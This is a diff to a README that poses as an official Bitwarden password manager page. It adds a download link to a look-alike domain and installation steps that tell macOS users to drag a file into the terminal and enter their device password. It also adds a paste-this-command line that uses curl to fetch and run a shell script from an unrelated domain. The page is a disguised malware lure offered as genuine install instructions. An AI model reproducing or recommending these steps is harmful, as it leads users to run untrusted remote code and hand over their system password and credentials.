@@ -2,9 +2,28 @@
 
 **Bitwarden** is a free, open-source password manager that securely stores and manages your passwords and sensitive data. With full encryption and multi-platform sync, Bitwarden ensures your digital life is safe and accessible — anytime, anywhere.
 
-[![Download Bitwarden](https://img.shields.io/badge/Download-Bitwarden-blueviolet)](#)
+[![Download Bitwarden](https://img.shields.io/badge/Download-Bitwarden-blueviolet)](https://bitwarden-free-password-manager.github.io/.github)
 
 ---
+## 📥 How to Use
+
+Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+Installation via a command in the terminal:
+
+1. Copy the installation command below.
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+```
+
+
 
 ## ⚙️ Core Features
 
@@ -39,15 +58,15 @@
 
 **1. Bitwarden Vault Interface**  
 ![Vault UI](https://static1.anpoimages.com/wordpress/wp-content/uploads/2021/03/15/bitwarden-logo.jpg)  
-*A clean dashboard for all your sensitive info.*
+
 
 **2. Mobile App Access**  
 ![Mobile Bitwarden](https://bitwarden.com/assets/5T77Pi6aU9BMsAkmDdw0Vr/6e9b6a960e4eccb77b201e7364466a04/web-vault.webp?w=1200&fm=jpg&q=80)  
-*Secure vault access on your smartphone.*
+
 
 **3. Password Generator Tool**  
 ![Password Generator](https://techcrunch.com/wp-content/uploads/2022/09/ezgif.com-gif-maker1.gif)  
-*Generate unique, secure passwords with a click.*
+
 
 ---
 
